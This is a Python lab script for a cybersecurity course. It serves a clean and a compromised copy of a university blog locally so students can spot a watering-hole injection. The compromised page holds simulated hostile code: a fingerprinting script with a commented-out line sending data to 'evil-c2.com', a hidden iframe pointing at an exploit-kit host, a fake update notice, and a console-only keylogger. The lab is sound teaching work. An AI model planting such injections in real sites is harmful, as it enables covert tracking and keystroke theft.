#!/usr/bin/env python3
"""
=============================================================================
  LAB 6: Watering Hole Attack Simulator
=============================================================================
  Course : Cybersecurity - Lecture 6: Social Engineering (Slide 36)
  Purpose: Simulates a watering hole attack where a frequently visited
           website is compromised to deliver malware to targeted visitors.
  
  Two servers:
    1. The "legitimate" blog/news site (port 8083) — trusted by users
    2. The same site AFTER compromise (port 8084) — with injected payload
  
  Students compare the two to identify the injected malicious code.
  
  Usage  : python watering_hole_simulator.py
=============================================================================
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import sys

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# The "legitimate" academic blog (BEFORE compromise)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CLEAN_SITE = """<!DOCTYPE html>
<html><head>
<title>CIS Research Blog - Ain Shams University</title>
<style>
    body { font-family: Georgia, serif; background: #fafafa; margin: 0; }
    .header { background: #2c3e50; color: white; padding: 20px; }
    .header h1 { margin: 0; }
    .nav { background: #34495e; padding: 10px 20px; }
    .nav a { color: #ecf0f1; text-decoration: none; margin-right: 20px; }
    .content { max-width: 800px; margin: 20px auto; padding: 20px; }
    .post { background: white; padding: 20px; margin: 15px 0; border-radius: 5px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
    .post h2 { color: #2c3e50; }
    .post .meta { color: #999; font-size: 14px; }
    .sidebar { background: #ecf0f1; padding: 15px; border-radius: 5px; margin: 15px 0; }
    footer { background: #2c3e50; color: #ecf0f1; text-align: center; padding: 15px; margin-top: 40px; }
    .clean-badge { background: #27ae60; color: white; padding: 8px 15px;
                   border-radius: 3px; display: inline-block; font-size: 12px; }
</style>
</head>
<body>
<div class="header">
    <h1>🎓 CIS Research Blog</h1>
    <p>Faculty of Computer & Information Science — Ain Shams University</p>
</div>
<div class="nav">
    <a href="#">Home</a> <a href="#">Research</a>
    <a href="#">Publications</a> <a href="#">Team</a> <a href="#">Contact</a>
</div>
<div class="content">
    <span class="clean-badge">✅ CLEAN VERSION (Port 8083) — No malicious code</span>
    
    <div class="post">
        <h2>New Machine Learning Research on Arabic NLP</h2>
        <p class="meta">Posted by Dr. Hassan Ibrahim | November 10, 2025</p>
        <p>Our team has published a new paper on transformer-based models
        for Arabic sentiment analysis, achieving state-of-the-art results
        on the ASTD dataset...</p>
        <a href="#">Read more →</a>
    </div>
    
    <div class="post">
        <h2>Cybersecurity Workshop: Social Engineering Awareness</h2>
        <p class="meta">Posted by Abdelrahman Hanfy | November 5, 2025</p>
        <p>Join us for a hands-on workshop on social engineering attack
        simulation and defense. Students will learn to identify phishing,
        pretexting, and baiting attacks...</p>
        <a href="#">Register →</a>
    </div>
    
    <div class="post">
        <h2>Call for Papers: IEEE ICCES 2026</h2>
        <p class="meta">Posted by Conference Committee | October 28, 2025</p>
        <p>We invite submissions for the 21st IEEE International Conference
        on Computer Engineering and Systems. Topics include AI, cybersecurity,
        IoT, and cloud computing...</p>
        <a href="#">Submit paper →</a>
    </div>
    
    <div class="sidebar">
        <h3>📢 Upcoming Events</h3>
        <ul>
            <li>Nov 15 — Cybersecurity Lab Session</li>
            <li>Nov 22 — ML Seminar Series</li>
            <li>Dec 1 — Final Project Submissions</li>
        </ul>
    </div>
</div>
<footer>
    <p>© 2025 Faculty of CIS, Ain Shams University. View page source to verify clean HTML.</p>
</footer>
</body></html>"""

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# The SAME site AFTER compromise (with injected malicious code)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

COMPROMISED_SITE = """<!DOCTYPE html>
<html><head>
<title>CIS Research Blog - Ain Shams University</title>
<style>
    body { font-family: Georgia, serif; background: #fafafa; margin: 0; }
    .header { background: #2c3e50; color: white; padding: 20px; }
    .header h1 { margin: 0; }
    .nav { background: #34495e; padding: 10px 20px; }
    .nav a { color: #ecf0f1; text-decoration: none; margin-right: 20px; }
    .content { max-width: 800px; margin: 20px auto; padding: 20px; }
    .post { background: white; padding: 20px; margin: 15px 0; border-radius: 5px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
    .post h2 { color: #2c3e50; }
    .post .meta { color: #999; font-size: 14px; }
    .sidebar { background: #ecf0f1; padding: 15px; border-radius: 5px; margin: 15px 0; }
    footer { background: #2c3e50; color: #ecf0f1; text-align: center; padding: 15px; margin-top: 40px; }
    .evil-badge { background: #e74c3c; color: white; padding: 8px 15px;
                  border-radius: 3px; display: inline-block; font-size: 12px; }
    /* INJECTED: Hide the malicious iframe */
    .tracking-pixel { position: absolute; width: 0; height: 0; border: 0; overflow: hidden; }
</style>
<!-- ════════════════════════════════════════════════════════════
     INJECTED BY ATTACKER: Malicious script hidden in page head
     This would not be visible to normal users!
     ════════════════════════════════════════════════════════════ -->
<script>
// MALICIOUS: Browser fingerprinting & exploit delivery (SIMULATED)
// In a real watering hole, this would check browser/plugin versions
// and deliver a zero-day exploit or redirect to an exploit kit.
(function() {
    var info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: screen.width + 'x' + screen.height,
        plugins: Array.from(navigator.plugins).map(function(p){return p.name}).join(','),
        timestamp: new Date().toISOString()
    };
    // SIMULATED: Send fingerprint to attacker's C2 server
    // In reality: new Image().src = 'http://evil-c2.com/collect?' + btoa(JSON.stringify(info));
    console.log('[WATERING HOLE] Browser fingerprint collected:', JSON.stringify(info));
    console.log('[WATERING HOLE] In a real attack, this data would be exfiltrated to the attacker.');
})();
</script>
</head>
<body>
<div class="header">
    <h1>🎓 CIS Research Blog</h1>
    <p>Faculty of Computer & Information Science — Ain Shams University</p>
</div>
<div class="nav">
    <a href="#">Home</a> <a href="#">Research</a>
    <a href="#">Publications</a> <a href="#">Team</a> <a href="#">Contact</a>
</div>
<div class="content">
    <span class="evil-badge">🚨 COMPROMISED VERSION (Port 8084) — Contains injected code!</span>
    <p style="color: red; font-size: 13px;">
        ⚠️ Compare this page's source code with the clean version (port 8083).
        Right-click → View Page Source to find the injected malicious code!
    </p>
    
    <div class="post">
        <h2>New Machine Learning Research on Arabic NLP</h2>
        <p class="meta">Posted by Dr. Hassan Ibrahim | November 10, 2025</p>
        <p>Our team has published a new paper on transformer-based models
        for Arabic sentiment analysis, achieving state-of-the-art results
        on the ASTD dataset...</p>
        <a href="#">Read more →</a>
    </div>
    
    <!-- INJECTED: Fake "security update" prompt -->
    <div class="post" style="border-left: 4px solid #e74c3c;">
        <h2>⚠️ Important: Browser Plugin Update Required</h2>
        <p class="meta" style="color: #e74c3c;">Security Notice | Auto-generated</p>
        <p>Your browser plugin is out of date and may be vulnerable to attacks.
        Please download the latest security update:</p>
        <a href="#" style="background: #e74c3c; color: white; padding: 8px 20px;
           text-decoration: none; border-radius: 3px;"
           onclick="alert('🚨 LAB ALERT: This download button would deliver malware in a real watering hole attack!\\n\\nThe attacker injected this fake update notice into the legitimate website.\\n\\nDefense: Only update software from official sources (vendor websites or OS update mechanisms).');return false;">
           Download Update →</a>
        <p style="font-size: 11px; color: #e74c3c;">[INJECTED BY ATTACKER — This post does not exist on the clean site]</p>
    </div>
    
    <div class="post">
        <h2>Cybersecurity Workshop: Social Engineering Awareness</h2>
        <p class="meta">Posted by Abdelrahman Hanfy | November 5, 2025</p>
        <p>Join us for a hands-on workshop on social engineering attack
        simulation and defense. Students will learn to identify phishing,
        pretexting, and baiting attacks...</p>
        <a href="#">Register →</a>
    </div>
    
    <div class="post">
        <h2>Call for Papers: IEEE ICCES 2026</h2>
        <p class="meta">Posted by Conference Committee | October 28, 2025</p>
        <p>We invite submissions for the 21st IEEE International Conference
        on Computer Engineering and Systems. Topics include AI, cybersecurity,
        IoT, and cloud computing...</p>
        <a href="#">Submit paper →</a>
    </div>
    
    <div class="sidebar">
        <h3>📢 Upcoming Events</h3>
        <ul>
            <li>Nov 15 — Cybersecurity Lab Session</li>
            <li>Nov 22 — ML Seminar Series</li>
            <li>Dec 1 — Final Project Submissions</li>
        </ul>
    </div>
</div>

<!-- INJECTED: Hidden iframe loading exploit kit (SIMULATED) -->
<iframe class="tracking-pixel" src="about:blank"
    data-real-src="http://evil-exploit-kit.com/deliver?target=university"
    title="INJECTED: In a real attack, this iframe would load an exploit kit">
</iframe>

<!-- INJECTED: Keylogger script (SIMULATED - does NOT actually log keys) -->
<script>
// MALICIOUS: Keylogger simulation (HARMLESS - only logs to console)
document.addEventListener('keypress', function(e) {
    console.log('[WATERING HOLE KEYLOGGER] Key captured:', e.key,
                '(This is a simulation — no data is exfiltrated)');
});
</script>

<footer>
    <p>© 2025 Faculty of CIS, Ain Shams University. View page source to find INJECTED code!</p>
</footer>
</body></html>"""


class CleanSiteHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(CLEAN_SITE.encode())
    def log_message(self, fmt, *args): pass


class CompromisedSiteHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"  [WATERING HOLE] Victim visited compromised site from {self.client_address[0]}")
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(COMPROMISED_SITE.encode())
    def log_message(self, fmt, *args): pass


def main():
    print("=" * 70)
    print("  🕳️  WATERING HOLE ATTACK LAB SIMULATOR")
    print("  Lecture 6: Slide 36")
    print("=" * 70)
    print(f"""
  📋 EXERCISE:
  Two versions of the same academic blog are running:
  
    ✅ CLEAN site    : http://127.0.0.1:8083  (before compromise)
    🚨 COMPROMISED   : http://127.0.0.1:8084  (after attacker injection)
  
  STUDENT TASKS:
  1. Open BOTH sites side by side in your browser
  2. They look almost identical — can you spot the difference?
  3. Right-click → "View Page Source" on BOTH pages
  4. DIFF the two sources to find the injected malicious code
  5. Open the browser's Developer Console (F12 → Console tab)
     on the compromised site to see the simulated data exfiltration
  
  IDENTIFY these injections in the compromised version:
    □ Browser fingerprinting <script> in the <head>
    □ Fake "Browser Plugin Update" post (social engineering!)
    □ Hidden <iframe> loading an exploit kit
    □ Keylogger <script> at the bottom
  
  🛡️ DEFENSE (Slide 36):
  • Use antimalware / EDR on endpoints
  • Deploy IDS/IPS to detect exploit kit traffic
  • Keep browsers and plugins updated
  • Use Content Security Policy (CSP) headers
  • Monitor for anomalous outbound connections
  
  Press Ctrl+C to stop.
""")
    
    clean = HTTPServer(('127.0.0.1', 8083), CleanSiteHandler)
    compromised = HTTPServer(('127.0.0.1', 8084), CompromisedSiteHandler)
    
    t1 = threading.Thread(target=clean.serve_forever, daemon=True)
    t2 = threading.Thread(target=compromised.serve_forever, daemon=True)
    t1.start()
    t2.start()
    
    try:
        t1.join()
    except KeyboardInterrupt:
        print("\n  Servers stopped.")
        clean.server_close()
        compromised.server_close()


if __name__ == '__main__':
    main()
